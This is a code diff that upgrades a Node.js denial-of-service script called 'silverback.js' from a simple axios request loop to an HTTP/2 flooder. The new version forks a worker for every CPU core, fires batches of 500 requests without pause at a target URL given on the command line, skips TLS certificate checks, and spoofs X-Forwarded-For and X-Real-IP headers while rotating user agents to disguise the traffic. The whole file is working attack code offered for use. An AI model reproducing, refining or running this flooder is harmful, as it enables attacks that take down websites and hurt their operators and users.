@@ -1,98 +1,102 @@
-const axios = require('axios');
 const fs = require('fs');
+const http2 = require('http2');
+const cluster = require('cluster');
+const os = require('os');
 
-// Load user agents from a file for disguising
+const target = process.argv[2];
+if (!target) {
+  console.error("Usage: node silverback.js <target_url>");
+  process.exit(1);
+}
+
 const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
+const parsed = new URL(target);
 
-// Track statistics
-let totalRequests = 0;
-let successfulRequests = 0;
-let failedRequests = 0;
+let total = 0;
+let hit = 0;
+let fail = 0;
 
-// Set logging interval to update stats every second
-const logInterval = 1000; // Log every second
-
-// Simple method to log stats periodically
-function logStats() {
-  setInterval(() => {
-    console.clear(); // Clear the terminal screen
-    console.log('SILVERBACK');
-    console.log('==========');
-    console.log(`TOTAL - ${totalRequests}`);
-    console.log(`HIT - ${successfulRequests}`);
-    console.log(`KXX - ${failedRequests}`);
-    console.log('=============================');
-  }, logInterval);
-}
-
-// Generate random User-Agent from the loaded file
-function getRandomUserAgent() {
-  return userAgents[Math.floor(Math.random() * userAgents.length)];
-}
-
-// Generate random IP to spoof the request (for X-Forwarded-For and X-Real-IP)
-function generateRandomIP() {
+// Spoofed IP generator
+function spoofIP() {
   return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
 }
 
-// Basic headers to simulate a real browser request
-function getSpoofedHeaders(target) {
+// Generate headers per request
+function genHeaders() {
   return {
-    'User-Agent': getRandomUserAgent(),
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Accept-Language': 'en-US,en;q=0.9',
-    'Connection': 'keep-alive',
-    'Cache-Control': 'no-cache',
-    'X-Forwarded-For': generateRandomIP(), // Random spoofed IP
-    'X-Real-IP': generateRandomIP(), // Another random spoofed IP
-    'Upgrade-Insecure-Requests': '1',
-    'DNT': '1',
-    'Range': 'bytes=0-1000',
-    'TE': 'Trailers',
+    ':method': 'GET',
+    ':path': parsed.pathname + parsed.search,
+    ':authority': parsed.hostname,
+    'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+    'x-forwarded-for': spoofIP(),
+    'x-real-ip': spoofIP(),
+    'accept-language': 'en-US,en;q=0.9',
+    'accept': '*/*',
+    'upgrade-insecure-requests': '1',
+    'cache-control': 'no-cache',
+    'pragma': 'no-cache',
+    'dnt': '1',
+    'te': 'trailers'
   };
 }
 
-// Flooder function to continuously send requests
-async function sendRequest(target) {
-  try {
-    const response = await axios.get(target, {
-      headers: getSpoofedHeaders(target),
-      timeout: 5000, // Timeout for stealth mode (5 seconds)
-      validateStatus: (status) => status >= 200 && status < 400, // Only accept valid status codes
-    });
+// Main request loop
+function flood() {
+  const client = http2.connect(parsed.origin, {
+    rejectUnauthorized: false
+  });
 
-    // Successful request (status between 200-299)
-    if (response.status >= 200 && response.status < 300) {
-      successfulRequests++;
-    } else {
-      failedRequests++;
+  client.on('error', () => {
+    fail++;
+    client.destroy();
+  });
+
+  client.on('connect', () => {
+    function sendIt() {
+      for (let i = 0; i < 500; i++) {
+        const req = client.request(genHeaders());
+
+        req.on('response', () => {
+          hit++;
+          total++;
+          req.close();
+        });
+
+        req.on('error', () => {
+          fail++;
+          total++;
+        });
+
+        req.end();
+      }
+      setImmediate(sendIt); // Keep firing
     }
 
-    totalRequests++;
-  } catch (error) {
-    failedRequests++;
-    totalRequests++;
-    console.error(`[Error] ${error.message}`);
-  }
+    sendIt();
+  });
 }
 
-// Main process to initiate the flooding with multiple requests
-function startFlood(target) {
-  if (!target) {
-    console.error('Usage: node silverback.js <target_url>');
-    process.exit(1);
-  }
+// Logging (in master only)
+if (cluster.isMaster) {
+  console.clear();
+  console.log("SILVERBACK");
+  console.log("===========");
 
-  // Start logging stats in a separate interval
-  logStats();
-
-  // Send requests as fast as possible
   setInterval(() => {
-    sendRequest(target); // Send a request every 10 milliseconds (100 requests per second)
-  }, 10); // Adjust this interval for higher RPS
-}
+    console.clear();
+    console.log("SILVERBACK");
+    console.log("===========");
+    console.log(`TOTAL - ${total}`);
+    console.log(`HIT   - ${hit}`);
+    console.log(`KXX   - ${fail}`);
+  }, 1000);
 
-// Execute the flood with target URL passed as a command argument
-const target = process.argv[2];
-startFlood(target); // Continuous flood with no limit
+  // Fork all cores
+  const cores = os.cpus().length;
+  console.log(`Starting SILVERBACK flood with ${cores} threads...`);
+  for (let i = 0; i < cores; i++) {
+    cluster.fork();
+  }
+} else {
+  flood();
+}
